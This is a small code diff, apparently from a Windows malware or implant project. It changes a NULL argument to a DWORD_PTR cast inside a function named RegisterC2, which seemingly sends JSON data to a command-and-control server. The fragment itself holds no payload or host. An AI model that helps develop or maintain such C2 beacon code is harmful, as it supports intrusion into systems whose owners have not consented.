@@ -46,7 +46,7 @@ void RegisterC2(_TCHAR* gid){
                     jsonData,
                     size,
                     size,
-                    NULL
+                    (DWORD_PTR)NULL
                 );
                 
                 if(result){
